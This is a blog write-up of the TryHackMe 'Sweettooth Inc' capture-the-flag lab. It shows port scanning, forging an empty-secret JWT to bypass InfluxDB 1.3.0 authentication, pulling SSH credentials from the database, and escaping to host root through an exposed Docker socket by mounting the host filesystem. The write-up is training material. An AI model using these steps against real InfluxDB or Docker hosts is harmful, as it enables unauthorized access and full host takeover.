---
title: Sweettooth Inc Writeup
author: mooncakeza
date: 2021-08-02 9:00am
categories: [tryhackme]
tags: [tryhackme, writeup, sweettoothinc]
math: true
image: /assets/img/thm/sweettoothinc/heading.png
---

With this challenge we had to answer some questions while getting the `user.txt` and `root.txt` flags.

## TASK 2 - Enumeration
1. Do a TCP portscan. What is the name of the database software running on one of these ports?

I kicked off a `RustScan` and passed `NMAP` through it.


```
rustscan -a 10.10.243.165 --ulimit 5000 -- -A -sC -sV 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/mooncake/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.243.165:111
Open 10.10.243.165:2222
Open 10.10.243.165:8086
Open 10.10.243.165:47330
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 22:02 SAST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
Initiating Ping Scan at 22:02
Scanning 10.10.243.165 [2 ports]
Completed Ping Scan at 22:02, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:02
Completed Parallel DNS resolution of 1 host. at 22:02, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:02
Scanning 10.10.243.165 [4 ports]
Discovered open port 111/tcp on 10.10.243.165
Discovered open port 8086/tcp on 10.10.243.165
Discovered open port 47330/tcp on 10.10.243.165
Discovered open port 2222/tcp on 10.10.243.165
Completed Connect Scan at 22:02, 0.16s elapsed (4 total ports)
Initiating Service scan at 22:02
Scanning 4 services on 10.10.243.165
Completed Service scan at 22:02, 12.47s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.243.165.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 5.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.71s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
Nmap scan report for 10.10.243.165
Host is up, received conn-refused (0.16s latency).
Scanned at 2021-07-27 22:02:34 SAST for 19s

PORT      STATE SERVICE REASON  VERSION
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35234/udp6  status
|   100024  1          39716/tcp6  status
|   100024  1          45434/udp   status
|_  100024  1          47330/tcp   status
2222/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALOlP9Bx9VQxs4JDY8vovlJp+l+pPX2MGttzN2gGNYABXAVSF9CA14OituA5tcJd5/Nv3Ru3Xyu8Yo5SV0d82rd7L/NF5Relx+iiVF+bigo329wbV3wsIrRQGUYHXiMjAs8WqQR+XKjOm3q4QLVxe/jU1I1ddy6/xO4fL7nOSh3RAAAAFQDKuQDe9pQtmnqvJkZ7QuCGm31+vQAAAIBENh/MS3oHvz1tCC4nZYwdAYZMBj2It0gYCMvD0oSkqL9IMaP9DIt/5G3D9ARrZPeSP4CqhfryIGHS7t59RNdnc3ukEsfJPo23bPBwWdIW7HXp9XDqyY1kD6L3Tq0bpeXpeXt6FQ93rFxncZngFkCrMD4+YytS532qPHMPOWh75gAAAIA7TohVech8kWTh6KIMl2Y61s9cwUqwrTkqJIYMdZ73nP69FD0bw08vyrdAwtVnsqRaNzsVVz9sBOOz3wmp/ZNI5NiuyA0UwEcxPj5k6jCn620gBpMEzVy6a8Ih3yRYHoiVMrQ/PIuoeIGxeYGckCorv8jSz2O3pq1Fnz23FRPH2A==
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbBmLBPg9mxkAdEbJGnz0v6Jzo4qdBcajkaIBKewKyz6OQTvyhVcDReSB2Dz0nl4mPCs3UN58hSNStCYXjZcpIBpqz2pHupVlqQ7u41Vo2W8u0nVFLt2U8JhTtA9wE6MA9GhitkN3Qorhxb3klCpSnWCDdcmkdNL0EYxZV53A52VWiNGX3vYkdMAKHAmp/VHvrsIeHozqflL8vD2UIoDmxDJwgXJRsr2iGVU1fL/Bu/DwlPwJkm50ua99yPpZbvCS9EwWki76aEtZSbcM4WHzx33Oe3tLXLCfKc9CJdIW35nBvpe5Dxl7gLR/mCHp2iTpdx1FmpSf+JjO/m2vKwL4X
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHufHfqIZHVEKYC/yyNS+vTt35iULiIWoFNSQP/Bm/v90QzZjsYU9MSt7xdlR/2LZp9VWk32nl5JL65tvCMImxc=
|   256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEYHtE8GbpGSlNB+/3IWfYRFrkJB+N9SmKs3Uh14pPj
8086/tcp  open  http    syn-ack InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
47330/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:02
Completed NSE at 22:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
```


From the scan we see the following ports open:
- 111 : RPC INFO
- 2222 : SSH
- 8086 : HTTP
- 47339 : UNKNOWN

From `port 8086` we can see that there is an `InfluxDB` on this port.
We have the answer for the first question here.

## TASK 3 - Database exploration and user flag

Here we get given 5 questions to answer.

1. What is the database user you find?
2. What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?
3. What is the highest rpm the motor of the mixer reached?
4. What username do you find in one of the databases?
5. user.txt

Let us start enumerating `port 8086`.
For this room I decided to rather use command line rather than a web browser and Burp.

```
curl 10.10.243.165:8086
404 page not found
```

We get a 404. Time to see if we can find any directories or files with `feroxbuster`.

```
feroxbuster -u http://10.10.243.165:8086

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.243.165:8086
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
204        0l        0w        0c http://10.10.243.165:8086/status
401        1l        5w       55c http://10.10.243.165:8086/query
204        0l        0w        0c http://10.10.243.165:8086/ping
405        1l        3w       19c http://10.10.243.165:8086/write
[####################] - 1m     29999/29999   0s      found:4       errors:0      
[####################] - 1m     29999/29999   290/s   http://10.10.243.165:8086
```

We find two directories that don't return anything. `/status` and `/ping`

The other two `/query` and `/write` gives us the following

```
curl http://10.10.243.165:8086/query
{"error":"unable to parse authentication credentials"}
```
```
curl http://10.10.243.165:8086/write
Method Not Allowed
```

Seems we require authentication credentials.

After some research and googling, there was the following article

[https://www.komodosec.com/post/when-all-else-fails-find-a-0-day](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day)

You can read up on this exploit in the article but essentially we will be creating our own  `JWT token` and with that we will be able to send queries to InfluxDB

From the article, our first step is to get the username.

```
curl http://10.10.243.165:8086/debug/requests 
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}
```

With this, we find the username for Question 1 for Task 2.

Now for the JWT token.

We go to [https://jwt.io/](https://jwt.io/)

This is the format of the JWT token.

```sh
header - {"alg": "HS256", "typ": "JWW"} 
payload - {"username":"username","exp":1727388403} 
signature - HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),<leave this field empty>) 
```

The expiry date is in the form of `epoch time`.
To convert the time to epoch time we can do it here - [https://www.epochconverter.com/](https://www.epochconverter.com/)
Just make sure you `set the time to in the future so that the JWT token does not expire`.
I set mine to somewhere in 2024.

It should look something like this.

![JWT TOKEN](/assets/img/thm/sweettoothinc/JWT_Token.png)

Now we can send queries to InfluxDB.

It took a bit to understand how to query the API but eventually managed reading the following documentation - [https://docs.influxdata.com/influxdb/v1.8/tools/api/](https://docs.influxdata.com/influxdb/v1.8/tools/api/)

We can send the following to list the databases.

<b>NOTE: I AM PIPING THE QUERY TO JQ TO MAKE THE OUTPUT MORE READABLE. 
YOU WILL HAVE TO INSTALL IT.</b>

```
curl -s 'http://10.10.243.165:8086/query' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ" -X POST --data-urlencode 'q=show databases' | jq
{
  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "name": "databases",
          "columns": [
            "name"
          ],
          "values": [
            [
              "creds"
            ],
            [
              "docker"
            ],
            [
              "tanks"
            ],
            [
              "mixer"
            ],
            [
              "_internal"
            ]
          ]
        }
      ]
    }
  ]
}

```


To query for "tables" inside the databases, instead of using `show tables`, like we would  use with MySQL or PostgreSQL, we need to use `show measurements`

Question 2 had us look for something at an certain EPOC time. 
Going to https://www.epochconverter.com/ we enter the EPOC time to match the time better to answer the question and we just look at the corrospoding date and we get the temperature.

It can be found with the following query on the `tanks` database, in the `water_tank` bucket.

```
curl -s 'http://10.10.243.165:8086/query' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ" -X POST  --data-urlencode "db=tanks" --data-urlencode "q=select * from water_tank" | jq
```

Question 3's answer can be found in the `mixer` database, in the `mixer_stats` bucket.

```
curl -s 'http://10.10.243.165:8086/query' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ" -X POST  --data-urlencode "db=mixer" --data-urlencode "q=select * from mixer_stats" | jq
```

Question 4 can be found  in the `creds` database, in the `ssh` bucket.

```
curl -s 'http://10.10.243.165:8086/query' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ" -X POST  --data-urlencode "db=creds" --data-urlencode "q=select * from ssh" | jq
{
  "results": [
    {
      "statement_id": 0,
      "series": [
        {
          "name": "ssh",
          "columns": [
            "time",
            "pw",
            "user"
          ],
          "values": [
            [
              "2021-05-16T12:00:00Z",
              7788764472,
              "uzJk6Ry98d8C"
            ]
          ]
        }
      ]
    }
  ]
}
```

We now have some credentials that looks to be the ssh credentials?

`username: uzJk6Ry98d8C`
`password: 7788764472`

Let's try use the creds to login via SSH

```
ssh uzJk6Ry98d8C@10.10.243.165 -p 2222
uzJk6Ry98d8C@10.10.243.165's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 27 21:05:14 2021 from ip-10-8-18-252.eu-west-1.compute.internal
uzJk6Ry98d8C@76b4f9ebadf9:~$ 
```

We also find the `user.txt` flag

```
uzJk6Ry98d8C@76b4f9ebadf9:~$ ls -lsa
total 24
4 drwxr-xr-x 4 uzJk6Ry98d8C uzJk6Ry98d8C 4096 Jul 27 19:57 .
4 drwxr-xr-x 7 root         root         4096 Jul 27 19:56 ..
0 lrwxrwxrwx 1 uzJk6Ry98d8C uzJk6Ry98d8C    9 May 18 14:50 .bash_history -> /dev/null
4 drwxr-xr-x 7 uzJk6Ry98d8C uzJk6Ry98d8C 4096 Jul 27 19:57 data
4 -rw-r--r-- 1 uzJk6Ry98d8C uzJk6Ry98d8C  527 Jul 27 19:57 meta.db
4 -rw-r--r-- 1 uzJk6Ry98d8C uzJk6Ry98d8C   22 May 18 14:50 user.txt
4 drwx------ 7 uzJk6Ry98d8C uzJk6Ry98d8C 4096 Jul 27 19:57 wal
```

## TASK 4 - Privilege escalation

Now we need to find `/root/root.txt`

First thing I noticed was that we were in a docker image and that there was the following process running from a `ps -ef`

```
uzJk6Ry+  6941    16  0 19:57 ?        00:00:00 socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock
```

`socat` was exposing `/var/run.docker.sock` on `port 8080`.
Having this exposed allows us to query Docker.
We do not have the Docker command available on the remote machine so the easiest way to do this would be to leverage this by using `SSH port forwarding` to my machine `to expose port 8080`. We would need to make sure we have the Docker CLI tools available on our own machine.

Let us setup the tunnel.

```
ssh -L 8080:localhost:8080 uzJk6Ry98d8C@10.10.243.165 -p 2222
```

Now we can use the Docker command to communicate with the Docker instance.

Let's see what we have

###### Docker Images

```
curl -s http://127.0.0.1:8080/images/json | jq 
[
  {
    "Containers": -1,
    "Created": 1621349458,
    "Id": "sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e",
    "Labels": {},
    "ParentId": "sha256:213cc0db00922f32cf219291c2f81dfd410304b093a44703927a1db630d7722d",
    "RepoDigests": null,
    "RepoTags": [
      "sweettoothinc:latest"
    ],
    "SharedSize": -1,
    "Size": 358659530,
    "VirtualSize": 358659530
  },
  {
    "Containers": -1,
    "Created": 1499487353,
    "Id": "sha256:e1b5eda429c335c11c07ea85e63f8a60518af69212f19fe50a2a28717744b384",
    "Labels": {},
    "ParentId": "",
    "RepoDigests": [
      "influxdb@sha256:99ef42027ac794b038ceb829537e92881e7648fa8c62c89ce84531d69177a635"
    ],
    "RepoTags": [
      "influxdb:1.3.0"
    ],
    "SharedSize": -1,
    "Size": 227323286,
    "VirtualSize": 227323286
  }
]
```

###### Docker Containers

```
curl -s http://127.0.0.1:8080/containers/json | jq
[
  {
    "Id": "76b4f9ebadf90b163a385bfa469fc108b5993f27720011ab01877a1391e15ba1",
    "Names": [
      "/sweettoothinc"
    ],
    "Image": "sweettoothinc:latest",
    "ImageID": "sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e",
    "Command": "/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''",
    "Created": 1627415793,
    "Ports": [
      {
        "IP": "0.0.0.0",
        "PrivatePort": 22,
        "PublicPort": 2222,
        "Type": "tcp"
      },
      {
        "IP": "0.0.0.0",
        "PrivatePort": 8086,
        "PublicPort": 8086,
        "Type": "tcp"
      }
    ],
    "Labels": {},
    "State": "running",
    "Status": "Up About an hour",
    "HostConfig": {
      "NetworkMode": "default"
    },
    "NetworkSettings": {
      "Networks": {
        "bridge": {
          "IPAMConfig": null,
          "Links": null,
          "Aliases": null,
          "NetworkID": "7155b0990f259c3601099d66c948d42fea5711895942c368eb5517702643b43b",
          "EndpointID": "38fa09a0d58d1edd41e683f825c7b2286e543621962463c95af173202f36e4ea",
          "Gateway": "172.17.0.1",
          "IPAddress": "172.17.0.2",
          "IPPrefixLen": 16,
          "IPv6Gateway": "",
          "GlobalIPv6Address": "",
          "GlobalIPv6PrefixLen": 0,
          "MacAddress": "02:42:ac:11:00:02",
          "DriverOpts": null
        }
      }
    },
    "Mounts": [
      {
        "Type": "volume",
        "Name": "835c5e630755f761ee0093608569c65217b8cab8a7343d2bfdbdc3dae365e1e4",
        "Source": "",
        "Destination": "/var/lib/influxdb",
        "Driver": "local",
        "Mode": "",
        "RW": true,
        "Propagation": ""
      },
      {
        "Type": "bind",
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
      }
    ]
  }
]
```

We have two docker images.

`sweettoothinc` and `influxdb:1.3.0`

I went down a rabbit hole with an article I read `"Escaping the Whale"` and was trying to use that method to access the containers with not much luck but it was by far easier than that.

We can actually just run the following command to access the `sweettoothinc` instance.

```
docker -H localhost:8080 exec -it sweettoothinc sh
# cd /root       
# ls -lsa
total 24
4 drwx------  4 root root 4096 May 18 14:50 .
4 drwxr-xr-x 62 root root 4096 Jul 27 21:05 ..
4 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4 drwx------  2 root root 4096 Jul  8  2017 .gnupg
4 -rw-r--r--  1 root root  140 Nov 19  2007 .profile
4 -rw-r--r--  1 root root   22 May 18 14:50 root.txt
```


### TASK 5 - Escape!

For the final `/root/root.txt` we  needed just to access the other container.

```
docker -H localhost:8080 run -v /:/mnt/ --rm -it influxdb:1.3.0 chroot /mnt sh
# cd /root
# ls -lsa
total 28
4 drwx------  2 root root 4096 May 18 10:59 .
4 drwxr-xr-x 22 root root 4096 May 15 08:37 ..
0 lrwxrwxrwx  1 root root    9 May 15 14:17 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4 -rw-r--r--  1 root root  140 Nov 19  2007 .profile
4 -rw-r--r--  1 root root   66 May 15 14:15 .selected_editor
4 -rw-------  1 root root 1611 May 15 08:36 .viminfo
4 -rw-r--r--  1 root root   22 May 15 12:15 root.txt
# 
```

All in all  it was a fun little challenge and spent some time reading and going down rabbit holes which I can see now, I tend to overthink things. 
